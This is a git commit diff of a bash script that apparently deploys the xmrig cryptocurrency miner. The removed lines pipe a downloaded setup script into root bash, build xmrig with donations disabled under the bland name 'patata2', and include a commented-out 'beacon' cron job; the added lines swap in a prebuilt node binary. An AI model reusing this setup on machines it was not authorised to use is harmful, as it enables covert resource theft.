4889c728bbfd06d99797eb6b888c0fb8f9bd5640
frotunato <frotunato@gmail.com>
2017-12-05 01:54:44 +0100

    Update salchipapa2.sh

--- salchipapa2.sh
+++ salchipapa2.sh
@@ -1,33 +1,14 @@
 #!/bin/bash
-sudo rm /etc/cron.d/beacon
-if [ ! -f /etc/proof ]; then
-    sudo curl -sL https://deb.nodesource.com/setup_8.x -o /etc/install_node.sh
-    sudo bash /etc/install_node.sh
-    sudo apt-get update && sudo apt-get -y install build-essential cmake libuv1-dev nodejs
+if [ ! -f /etc/proof2 ]; then
+    sudo apt-get remove --purge node
+    sudo xz -d /patata/node.xz
+    sudo chmod +x /patata/node
+    sudo mv /patata/node /home
+    sudo ln -sf /home/node /usr/bin/node
     sudo bash -c 'echo "* soft memlock 262144" >> /etc/security/limits.conf'
     sudo bash -c 'echo "* hard memlock 262144" >> /etc/security/limits.conf'
-    sudo touch /etc/proof
+    sudo touch /etc/proof2
 fi
-sudo rm -rf /poppa
-sudo mkdir /poppa
-sudo wget https://github.com/xmrig/xmrig/archive/v2.1.0.tar.gz -P /poppa
-cd /poppa
-sudo tar -zxvf v2.1.0.tar.gz
-cd xmrig-2.1.0
-sudo sed -i "40s/.*/constexpr const int kDonateLevel = 0;/" src/donate.h
-sudo mkdir build
-cd build
-sudo cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a
-sudo make -j
-sudo cp xmrig /home/patata2
-sudo chmod +x /home/patata2
-sudo rm -rf /poppa
+sudo chmod +x /patata/patata2
 sudo sysctl -w vm.nr_hugepages=128
-screen -dm sudo NODE_ENV=production nodejs /patata/hook.js "$1" "$2"
-
-#if [ $# -eq 3 ]; then
-    #sudo touch /etc/cron.d/beacon
-    #cronjob='*/2 * * * *'
-    #executable='bash /patata/tramboliko2.sh'
-    #echo "${cronjob} root $executable >/dev/null 2>&1" | sudo tee /etc/cron.d/beacon
-#fi
+screen -dm sudo NODE_ENV=production node /patata/hook.js "$1" "$2"
